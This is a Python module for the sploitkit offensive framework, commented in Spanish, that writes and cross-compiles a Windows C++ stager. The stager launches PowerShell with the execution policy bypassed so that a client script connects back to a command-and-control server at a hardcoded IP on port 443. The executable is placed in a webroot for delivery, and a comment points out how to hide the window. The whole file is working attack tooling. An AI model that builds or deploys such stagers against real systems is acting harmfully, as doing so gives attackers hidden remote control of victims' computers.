from sploitkit import *
import os
import subprocess
import time

class multi_stage_channels(Module):
	""" Genera un ejecutable para conectar un cliente al servidor c2 (transportc2)

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
        Option(
            'PAYLOAD',
            "Nombre del script ps1",
            True,
            #set_callback=lambda o: o.root._set_app_folder(),
        ): "my_client",
         Option(
            'LHOST',
            "Tu direccion IP.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): "0.0.0.0",
        Option(
            'EXE_NAME',
            "Nombre del exe.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): "name.cpp",
		Option(
            'OUTPUT',
            "Path del folder donde se colocan las salidas.",
            True,
            #set_callback=lambda o: o.root._set_logging(o.value),
        ): " ",
    })

	def run(self):
		parent_path = "Prueba/sourcecodes/"
		parent_webroot_path = "Prueba/webroot/"


		c2client = ''.join(list(self.config.get('PAYLOAD')))
		lhost   = ''.join(list(self.config.get('LHOST')))
		name     = ''.join(list(self.config.get('EXE_NAME')))


		c2client = "client.ps1"
		lhost = "10.10.1.13"
		name = 'ejecutarPSs.cpp'
		fullname = parent_path+name
		exename = "ejecuta"
		outfile = parent_webroot_path + exename


		STARTC2 = '''
		#include <iostream>
		#include <winsock2.h>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define PSSCRIPT "%s"
		#define IPADDR "%s"
		using namespace std;

		int main(void){
		       string nombre_script = PSSCRIPT;
		       string ipaddr = IPADDR;
		       char username[UNLEN+1];
		       DWORD username_len = UNLEN+1;
		       GetUserName(username, &username_len);
		       string user(username);      
		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\"";
		       printf("%%s\\n",strCMD.c_str());
		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.

		}
		''' % (c2client, lhost)
		f = open(fullname,"w")
		f.write(STARTC2)
		print("Archivo "+ fullname + " creado.")
		#i686-w64-mingw32-g++ ejecutarPSs.cpp -o ejecuta -static-libgcc -static-libstdc++
		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++"]
		print("{} {}".format(fullname, outfile))
		subprocess.Popen(args)
		print("Compilado {}".format(outfile))
		print("Inicia tu listener C2.")
		#time.sleep(1)
		#args = ['terminator', '-x', 'python3', 'base/modules/c2localclient/c2clientelocal.py']
		#cmd = "/usr/bin/x-terminal-emulator -e \"python3 base/modules/c2localclient/c2clientelocal.py; sleep 10\""
		#args = ['terminator' ,'-x', 'echo', 'hello']
		#subprocess.call(args, start_new_session=True)
